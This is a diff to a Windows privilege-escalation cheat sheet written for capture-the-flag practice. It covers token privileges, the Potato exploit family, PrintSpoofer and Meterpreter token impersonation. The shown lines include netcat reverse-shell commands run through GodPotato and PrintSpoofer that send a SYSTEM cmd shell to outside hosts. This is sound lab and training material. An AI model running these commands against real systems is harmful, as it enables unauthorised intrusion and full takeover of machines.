@@ -128,7 +128,8 @@ For most CTFS all you should need is winPEAS
 
 ## Checklists    
 [HackTricks](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)  
-[Fuzzy security](http://www.fuzzysecurity.com/tutorials/16.html) 
+[Fuzzy security](http://www.fuzzysecurity.com/tutorials/16.html)    
+[Windows 10 Exploits](https://github.com/nu11secur1ty/Windows10Exploits)    
 
 ## Privilege Exploits 
 [Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)   
@@ -142,7 +143,7 @@ For most CTFS all you should need is winPEAS
     SeBackup or SeRestore-> provides full read permissions and ability to make backups   
 
     If the machine is >= Windows 10 1809 & Windows Server 2019 - Try God Potato
-    If the machine is < Windows 10 1809 & < Windows Server 2019 - Try Juicy Potato
+    If the machine is < Windows 10 1809 & < Windows Server 2019 - Try Juicy Potato or PrintSpoofer   
 ### Meterpreter Token Impersonation    
 
     load incognito    
@@ -150,17 +151,20 @@ For most CTFS all you should need is winPEAS
     impersonate_token domain\\username   #impersonate a domain user   
 ### SeBackupPrivilege      
 [DLLs to enable and exploit](https://github.com/giuliano108/SeBackupPrivilege)     
+
 ### GodPotato    
 https://github.com/BeichenDream/GodPotato     
 
-    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"   #check framework version    
+    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"   #check framework version to download the right binary       
+    GodPotato -cmd "cmd /c whoami"    
     GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.1 4444"
 ### PrintSpoofer 
 SeImpersonatePrivilege. Windows Server 2016, Server 2019, and Windows 10.          
 [Print Spoofer](https://github.com/itm4n/PrintSpoofer)       
 [Compiled exe](https://github.com/dievus/printspoofer)          
 
-     PrintSpoofer.exe -i -c cmd
+     PrintSpoofer.exe -i -c cmd   
+     c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"    
 
 ### Rogue Potato   
 [Blog post](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)   
@@ -191,7 +195,7 @@ Common good CLSIDs: Wuauserv, Wsearch, XmlGameSave and BITS
 Try other CLSIDs from the list above or testing scripts   
 
 ### Rotten Potato      
-Works up to Windows 2016 and Windows 10 1803     
+Works up to Windows 2016 and Windows 10 1803. JuicyPotato is a newer version         
 SeImpersonate or SeAssignPrimaryToken      
 
 ### Hot Potato (Original)    
